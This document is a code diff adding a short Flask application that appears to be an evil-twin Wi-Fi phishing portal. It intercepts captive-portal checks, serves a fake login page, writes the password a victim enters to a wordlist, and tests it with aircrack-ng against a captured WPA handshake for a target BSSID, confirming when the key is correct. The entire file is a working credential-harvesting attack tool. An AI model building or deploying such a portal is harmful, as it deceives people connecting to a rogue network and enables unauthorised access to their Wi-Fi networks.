@@ -1,0 +1,49 @@
+import subprocess
+import sys
+
+from flask import Flask, redirect, render_template, request, url_for
+
+app = Flask(__name__)
+is_debug = len(sys.argv) != 2
+bssid = str(sys.argv[1])
+
+
+@app.route("/gen_204")
+def gen_204():
+    return redirect(url_for("index"))
+
+
+@app.route("/hotspot-detect.html")
+def hotspot_detect():
+    return render_template("hotspot-detect.html")
+
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST":
+        entered_password = request.form.get("password")
+
+        with open("wordlist.txt", "w") as f:
+            f.write(entered_password + "\n")
+
+        result = subprocess.run(
+            [
+                "aircrack-ng",
+                "-w",
+                "wordlist.txt",
+                "-b",
+                bssid,
+                "handshake.cap",
+            ],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+
+        if "KEY FOUND!" in result.stdout.decode():
+            return render_template("success.html")
+
+    return render_template("index.html")
+
+
+if __name__ == "__main__":
+    app.run(debug=is_debug)
